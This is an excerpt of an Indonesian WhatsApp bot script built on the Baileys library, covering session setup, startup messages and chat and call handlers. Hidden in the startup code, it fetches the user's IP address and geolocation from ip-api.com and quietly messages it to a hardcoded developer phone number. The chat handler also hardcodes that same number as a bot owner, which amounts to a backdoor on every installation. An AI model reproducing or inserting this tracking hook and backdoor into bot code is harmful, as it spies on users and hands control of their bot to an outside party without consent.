...
nocache('./wibu.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
...
denz.autoReconnect = ReconnectMode.onConnectionLost
    ...
    fs.existsSync('./wibu.json') && denz.loadAuthInfo('./wibu.json')
  ...
  fs.writeFileSync("./wibu.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 ...
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer S h e r l y n n Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wibu.jpg'),sourceUrl:"https://wa.me/6289601738686?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("6289601738686@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer S H E R L Y N N botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wibu.jpg'),sourceUrl:"https://wa.me/6289601738686?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   denz.on('chat-update', async (mek) => {
        require('./wibu.js')(denz, mek)
        ownerNumber = ["6289601738686@s.whatsapp.net","6289601738686@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6289601738686@s.whatsapp.net"
...
buttons: gbutsan,
headerType: 4 }
			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./wibu.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
...
denz.on('CB:action,,call', async json => {
        ...
        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wibu.jpg'),sourceUrl:`https://wa.me/6283162388082?text=Assalamualaikum`}}})
        await sleep(5000)
